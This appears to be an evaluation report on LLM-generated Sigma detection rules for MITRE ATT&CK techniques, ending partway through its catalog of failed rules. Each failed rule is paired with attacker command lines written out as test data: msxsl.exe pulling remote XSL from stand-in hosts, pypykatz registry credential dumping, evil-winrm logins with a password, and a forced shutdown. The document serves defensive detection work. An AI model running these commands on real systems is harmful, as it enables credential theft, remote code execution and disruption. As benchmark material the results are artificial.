# Final Test on Set 3: Evaluation Report

This report presents the final evaluation of ATIDEP on locked Test Set 3 (20 techniques, 3 repeats, N=60 per configuration, temperature 0.2, seed 100).

## 1. Overall Performance by Configuration

| Configuration | Role | Model | Prompt | Syntax Errors | Single Pass (/60) | Strict Pass (/60) | Strict Pass (%) | MISSED_SHOWN | TOO_NARROW | NOISY | Techniques Passed (>=2/3) | Avg Sec/Rule |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 14B Primary (v3b) | **PRIMARY** | `qwen2.5-coder:14b` | `v3b` | 0 | 60/60 | **57/60** | 95.0% | 0 | 3 | 0 | **19/20** | 6.27s |
| 7B Primary (v3a) | **PRIMARY** | `qwen2.5-coder:7b` | `v3a` | 1 | 59/60 | **58/60** | 96.7% | 0 | 1 | 0 | **20/20** | 4.08s |
| 14B Baseline (v1) | **BASELINE** | `qwen2.5-coder:14b` | `v1` | 0 | 54/60 | **47/60** | 78.3% | 6 | 7 | 0 | **16/20** | 5.12s |
| 7B Baseline (v1) | **BASELINE** | `qwen2.5-coder:7b` | `v1` | 1 | 56/60 | **35/60** | 58.3% | 3 | 21 | 0 | **11/20** | 3.69s |
| 14B Exploratory (v3a) | **EXPLORATORY** | `qwen2.5-coder:14b` | `v3a` | 0 | 58/60 | **55/60** | 91.7% | 2 | 3 | 0 | **18/20** | 5.72s |
| 7B Exploratory (v3b) | **EXPLORATORY** | `qwen2.5-coder:7b` | `v3b` | 0 | 59/60 | **54/60** | 90.0% | 1 | 5 | 0 | **18/20** | 4.37s |

## 2. Primary Comparison: Frozen Prompt vs. Baseline v1 Prompt

Comparison of each model under its frozen prompt against baseline prompt v1.

| Model | Metric | Baseline (v1) | Frozen Prompt | Absolute Difference | Relative Change |
| --- | --- | --- | --- | --- | --- |
| `qwen2.5-coder:14b` (PRIMARY MODEL) | Strict Pass (/60) | 47/60 | **57/60** | **+10** | **+21.3%** |
| `qwen2.5-coder:14b` (PRIMARY MODEL) | Techs Passed (>=2/3) | 16/20 | **19/20** | +3 | - |
| `qwen2.5-coder:7b` (COMPARISON MODEL) | Strict Pass (/60) | 35/60 | **58/60** | **+23** | **+65.7%** |
| `qwen2.5-coder:7b` (COMPARISON MODEL) | Techs Passed (>=2/3) | 11/20 | **20/20** | +9 | - |

### Per-Technique Paired Breakdown (Improved / Same / Worse)

| Technique | Variant Type | 14B v1 | 14B v3b (Primary) | 14B Shift | 7B v1 | 7B v3a (Primary) | 7B Shift |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `T1003.002` | values | 3/3 | 3/3 | **same** | 0/3 | 3/3 | **improved** |
| `T1021.006` | order_or_prefix | 3/3 | 3/3 | **same** | 1/3 | 3/3 | **improved** |
| `T1040` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1053.002` | values | 0/3 | 3/3 | **improved** | 3/3 | 3/3 | **same** |
| `T1082` | order_or_prefix | 0/3 | 3/3 | **improved** | 0/3 | 3/3 | **improved** |
| `T1112` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1113` | order_or_prefix | 3/3 | 3/3 | **same** | 0/3 | 3/3 | **improved** |
| `T1123` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1176.001` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1185` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1202` | values | 0/3 | 3/3 | **improved** | 0/3 | 2/3 | **improved** |
| `T1218` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1219.002` | order_or_prefix | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1220` | values | 3/3 | 3/3 | **same** | 1/3 | 3/3 | **improved** |
| `T1529` | values | 0/3 | 0/3 | **same** | 0/3 | 2/3 | **improved** |
| `T1563.002` | order_or_prefix | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1564.004` | order_or_prefix | 3/3 | 3/3 | **same** | 0/3 | 3/3 | **improved** |
| `T1572` | order_or_prefix | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1574` | values | 3/3 | 3/3 | **same** | 3/3 | 3/3 | **same** |
| `T1615` | order_or_prefix | 2/3 | 3/3 | **improved** | 0/3 | 3/3 | **improved** |

**Summary of paired technique shifts**:
- `qwen2.5-coder:14b` (v1 -> v3b): **4 improved**, **16 same**, **0 worse**.
- `qwen2.5-coder:7b` (v1 -> v3a): **9 improved**, **11 same**, **0 worse**.

## 3. Strict Passes Split by Variant Type

Set 3 contains 12 `values` variants and 8 `order_or_prefix` variants (36 and 24 evaluations per configuration respectively):

| Configuration | Role | Values Passes (/36) | Values Pass Rate | Order/Prefix Passes (/24) | Order/Prefix Pass Rate | Total Strict Pass (/60) |
| --- | --- | --- | --- | --- | --- | --- |
| 14B Primary (v3b) | PRIMARY | 33/36 | 91.7% | 24/24 | 100.0% | **57/60** |
| 7B Primary (v3a) | PRIMARY | 34/36 | 94.4% | 24/24 | 100.0% | **58/60** |
| 14B Baseline (v1) | BASELINE | 27/36 | 75.0% | 20/24 | 83.3% | **47/60** |
| 7B Baseline (v1) | BASELINE | 25/36 | 69.4% | 10/24 | 41.7% | **35/60** |
| 14B Exploratory (v3a) | EXPLORATORY | 31/36 | 86.1% | 24/24 | 100.0% | **55/60** |
| 7B Exploratory (v3b) | EXPLORATORY | 30/36 | 83.3% | 24/24 | 100.0% | **54/60** |

## 4. Strict Pass Count per Technique across Configurations (out of 3 repeats)

| Technique | Variant Type | 14B Primary (v3b) | 7B Primary (v3a) | 14B Baseline (v1) | 7B Baseline (v1) | 14B Exploratory (v3a) | 7B Exploratory (v3b) |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `T1003.002` | values | 3/3 | 3/3 | 3/3 | 0/3 | 3/3 | 3/3 |
| `T1021.006` | order_or_prefix | 3/3 | 3/3 | 3/3 | 1/3 | 3/3 | 3/3 |
| `T1040` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1053.002` | values | 3/3 | 3/3 | 0/3 | 3/3 | 3/3 | 3/3 |
| `T1082` | order_or_prefix | 3/3 | 3/3 | 0/3 | 0/3 | 3/3 | 3/3 |
| `T1112` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1113` | order_or_prefix | 3/3 | 3/3 | 3/3 | 0/3 | 3/3 | 3/3 |
| `T1123` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1176.001` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1185` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1202` | values | 3/3 | 2/3 | 0/3 | 0/3 | 3/3 | 3/3 |
| `T1218` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1219.002` | order_or_prefix | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1220` | values | 3/3 | 3/3 | 3/3 | 1/3 | 1/3 | 0/3 |
| `T1529` | values | 0/3 | 2/3 | 0/3 | 0/3 | 0/3 | 0/3 |
| `T1563.002` | order_or_prefix | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1564.004` | order_or_prefix | 3/3 | 3/3 | 3/3 | 0/3 | 3/3 | 3/3 |
| `T1572` | order_or_prefix | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1574` | values | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 | 3/3 |
| `T1615` | order_or_prefix | 3/3 | 3/3 | 2/3 | 0/3 | 3/3 | 3/3 |
| **Total Strict** | - | **57/60** | **58/60** | **47/60** | **35/60** | **55/60** | **54/60** |

## 5. TOO_NARROW Failure Mode Classification

Classification of all TOO_NARROW rules across configurations into primary blocking condition classes:

| Configuration | Total TOO_NARROW | ALIAS_IMAGE | VALUE | FLAG_INCIDENTAL | ADJACENT | PREFIX | OTHER |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 14B Primary (v3b) | 3 | 0 | 0 | 0 | 3 | 0 | 0 |
| 7B Primary (v3a) | 1 | 0 | 1 | 0 | 0 | 0 | 0 |
| 14B Baseline (v1) | 7 | 0 | 3 | 0 | 0 | 0 | 4 |
| 7B Baseline (v1) | 21 | 0 | 6 | 0 | 15 | 0 | 0 |
| 14B Exploratory (v3a) | 3 | 0 | 0 | 0 | 3 | 0 | 0 |
| 7B Exploratory (v3b) | 5 | 0 | 3 | 0 | 2 | 0 | 0 |

As anticipated, `ALIAS_IMAGE` is 0 across all configurations because all Set 3 techniques retain consistent executable names across shown and variant lines.

## 6. Catalog of Failed Rules

Full listing of all first-try rules that did not pass the strict gate:

Total non-pass first-try rules across all 360 evaluations: **54**.

### 14B Primary (v3b) (3 failed rules)

#### `T1529` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

#### `T1529` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

#### `T1529` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

### 7B Primary (v3a) (2 failed rules)

#### `T1202` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all:
            - 'surfacecheck'
            - 'C:\\temp\\payload.txt'
    condition: selection
```

#### `T1529` (Repeat 2) - Verdict: `SYNTAX_ERROR`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t': '0'
    condition: selection
```

### 14B Baseline (v1) (13 failed rules)

#### `T1053.002` (Repeat 1) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\at.exe 12:00 /interactive cmd.exe`
- **Variant line**: `C:\Windows\System32\at.exe 23:15 /interactive cmd.exe`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\at.exe'
        CommandLine|contains|all:
            - ' /interactive '
            - ' cmd.exe '
    condition: selection
```

#### `T1053.002` (Repeat 2) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\at.exe 12:00 /interactive cmd.exe`
- **Variant line**: `C:\Windows\System32\at.exe 23:15 /interactive cmd.exe`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\at.exe'
        CommandLine|contains|all: 
            - ' /interactive '
            - ' cmd.exe '
    condition: selection
```

#### `T1053.002` (Repeat 3) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\at.exe 12:00 /interactive cmd.exe`
- **Variant line**: `C:\Windows\System32\at.exe 23:15 /interactive cmd.exe`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\at.exe'
        CommandLine|contains|all: 
            - ' /interactive '
            - ' cmd.exe '
    condition: selection
```

#### `T1082` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"`
- **Variant line**: `C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\dtrace.exe'
        CommandLine|contains|all: 
            - ' -w '
            - ' -n "BEGIN { lkd(0); }"'
    condition: selection
```

#### `T1082` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"`
- **Variant line**: `C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\dtrace.exe'
        CommandLine|contains|all: 
            - ' -w '
            - ' -n "BEGIN { lkd(0); }"'
    condition: selection
```

#### `T1082` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"`
- **Variant line**: `C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\dtrace.exe'
        CommandLine|contains|all: 
            - ' -w '
            - ' -n "BEGIN { lkd(0); }"'
    condition: selection
```

#### `T1202` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all: 
            - 'surfacecheck'
            - 'C:\temp\payload.txt'
    condition: selection
```

#### `T1202` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all:
            - 'surfacecheck'
            - 'C:\temp\payload.txt'
    condition: selection
```

#### `T1202` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all: 
            - 'surfacecheck'
            - 'C:\temp\payload.txt'
    condition: selection
```

#### `T1529` (Repeat 1) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|all: 
            - ' /r '
            - ' /t 0 '
    condition: selection
```

#### `T1529` (Repeat 2) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|all: 
            - ' /r '
            - ' /t 0 '
    condition: selection
```

#### `T1529` (Repeat 3) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|all: 
            - ' /r '
            - ' /t 0 '
    condition: selection
```

#### `T1615` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\gpresult.exe /z /user admin`
- **Variant line**: `C:\Windows\System32\gpresult.exe /user admin /z`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\gpresult.exe'
        CommandLine|contains|all: 
            - ' /z '
            - ' /user '
    condition: selection
```

### 7B Baseline (v1) (25 failed rules)

#### `T1003.002` (Repeat 1) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\tools\pypykatz.exe live registry`
- **Variant line**: `D:\ops\pypykatz.exe live registry`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\pypykatz.exe'
        CommandLine|contains: ' live registry '
    condition: selection
```

#### `T1003.002` (Repeat 2) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\tools\pypykatz.exe live registry`
- **Variant line**: `D:\ops\pypykatz.exe live registry`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\pypykatz.exe'
        CommandLine|contains: ' live registry '
    condition: selection
```

#### `T1003.002` (Repeat 3) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\tools\pypykatz.exe live registry`
- **Variant line**: `D:\ops\pypykatz.exe live registry`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\pypykatz.exe'
        CommandLine|contains: ' live registry '
    condition: selection
```

#### `T1021.006` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -i 10.0.0.1 -u admin -p Password123`
- **Variant line**: `C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -u admin -p Password123 -i 10.0.0.1`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\ruby.exe'
        CommandLine|contains: ' evil-winrm.rb -i '
    condition: selection
```

#### `T1021.006` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -i 10.0.0.1 -u admin -p Password123`
- **Variant line**: `C:\Ruby30-x64\bin\ruby.exe evil-winrm.rb -u admin -p Password123 -i 10.0.0.1`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\ruby.exe'
        CommandLine|contains: ' evil-winrm.rb -i '
    condition: selection
```

#### `T1082` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"`
- **Variant line**: `C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\dtrace.exe'
        CommandLine|contains: ' -w -n "BEGIN { lkd(0); }"'
    condition: selection
```

#### `T1082` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"`
- **Variant line**: `C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\dtrace.exe'
        CommandLine|contains: ' -w -n "BEGIN { lkd(0); }"'
    condition: selection
```

#### `T1082` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Program Files\DTrace\dtrace.exe -w -n "BEGIN { lkd(0); }"`
- **Variant line**: `C:\Program Files\DTrace\dtrace.exe -n "BEGIN { lkd(0); }" -w`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\dtrace.exe'
        CommandLine|contains: ' -w -n "BEGIN { lkd(0); }"'
    condition: selection
```

#### `T1113` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Psr.exe /start /output C:\temp\screen.zip`
- **Variant line**: `C:\Windows\System32\Psr.exe /output C:\temp\screen.zip /start`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Psr.exe'
        CommandLine|contains: ' /start /output '
    condition: selection
```

#### `T1113` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Psr.exe /start /output C:\temp\screen.zip`
- **Variant line**: `C:\Windows\System32\Psr.exe /output C:\temp\screen.zip /start`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Psr.exe'
        CommandLine|contains: ' /start /output '
    condition: selection
```

#### `T1113` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Psr.exe /start /output C:\temp\screen.zip`
- **Variant line**: `C:\Windows\System32\Psr.exe /output C:\temp\screen.zip /start`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Psr.exe'
        CommandLine|contains: ' /start /output '
    condition: selection
```

#### `T1202` (Repeat 1) - Verdict: `SYNTAX_ERROR`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all: 'surfacecheck', 'C:\temp\payload.txt'
    condition: selection
```

#### `T1202` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all: ['surfacecheck', 'C:\\temp\\payload.txt']
    condition: selection
```

#### `T1202` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\temp\payload.txt`
- **Variant line**: `C:\Windows\System32\Runscripthelper.exe surfacecheck C:\Users\Public\script.txt`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\Runscripthelper.exe'
        CommandLine|contains|all: ['surfacecheck', 'C:\\temp\\payload.txt']
    condition: selection
```

#### `T1220` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|all: ['C:\\temp\\data.xml', 'http://evil.com/sheet.xsl']
    condition: selection
```

#### `T1220` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|all: ['C:\temp\data.xml', 'http://evil.com/sheet.xsl']
    condition: selection
```

#### `T1529` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains: ' /r /t 0'
    condition: selection
```

#### `T1529` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains: ' /r /t 0'
    condition: selection
```

#### `T1529` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains: ' /r /t 0'
    condition: selection
```

#### `T1564.004` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip`
- **Variant line**: `C:\Windows\System32\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\PrintBrm.exe'
        CommandLine|contains: ' -b -f '
    condition: selection
```

#### `T1564.004` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip`
- **Variant line**: `C:\Windows\System32\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\PrintBrm.exe'
        CommandLine|contains: ' -b -f '
    condition: selection
```

#### `T1564.004` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\spool\tools\PrintBrm.exe -b -f C:\temp\backup.zip`
- **Variant line**: `C:\Windows\System32\spool\tools\PrintBrm.exe -f C:\temp\backup.zip -b`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\PrintBrm.exe'
        CommandLine|contains: ' -b -f '
    condition: selection
```

#### `T1615` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\gpresult.exe /z /user admin`
- **Variant line**: `C:\Windows\System32\gpresult.exe /user admin /z`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\gpresult.exe'
        CommandLine|contains: ' /z /user '
    condition: selection
```

#### `T1615` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\gpresult.exe /z /user admin`
- **Variant line**: `C:\Windows\System32\gpresult.exe /user admin /z`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\gpresult.exe'
        CommandLine|contains: ' /z /user '
    condition: selection
```

#### `T1615` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\gpresult.exe /z /user admin`
- **Variant line**: `C:\Windows\System32\gpresult.exe /user admin /z`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\gpresult.exe'
        CommandLine|contains: ' /z /user '
    condition: selection
```

### 14B Exploratory (v3a) (5 failed rules)

#### `T1220` (Repeat 2) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|windash|all:
            - 'http://'
            - 'https://'
    condition: selection
```

#### `T1220` (Repeat 3) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|windash|all:
            - 'http://'
            - 'https://'
    condition: selection
```

#### `T1529` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

#### `T1529` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

#### `T1529` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

### 7B Exploratory (v3b) (6 failed rules)

#### `T1220` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|windash: 'http://evil.com/sheet.xsl'
    condition: selection
```

#### `T1220` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|all:
            - 'http://evil.com/sheet.xsl'
    condition: selection
```

#### `T1220` (Repeat 3) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl`
- **Variant line**: `C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\msxsl.exe'
        CommandLine|contains|all:
            - 'http://evil.com/sheet.xsl'
    condition: selection
```

#### `T1529` (Repeat 1) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
